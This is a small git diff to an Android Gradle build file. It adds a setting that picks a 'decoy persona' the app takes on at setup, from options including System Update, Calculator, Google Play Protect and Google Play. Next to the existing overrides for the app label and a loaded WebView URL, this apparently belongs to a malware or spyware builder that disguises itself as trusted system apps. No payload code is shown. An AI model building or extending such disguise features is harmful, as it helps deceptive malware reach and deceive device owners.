@@ -82,6 +82,8 @@ android {
         // WebView / Google mode: empty string disables the override;
         // any non-empty value is loaded after setup completes.
         buildConfigField 'String',  'WEBVIEW_URL',    "\"${webviewUrl}\""
+        // Decoy persona deployed at setup (1=SysUpdate 2=Calc 3=Weather 4=PlayProtect 5=GooglePlay 6=FileMgr)
+        buildConfigField 'int', 'DECOY_CHOICE', project.hasProperty('decoyChoice') ? project.decoyChoice : '1'
 
         // When non-empty, resValue overrides the app_name string in strings.xml
         // so the launcher shows the custom label without touching the source tree.
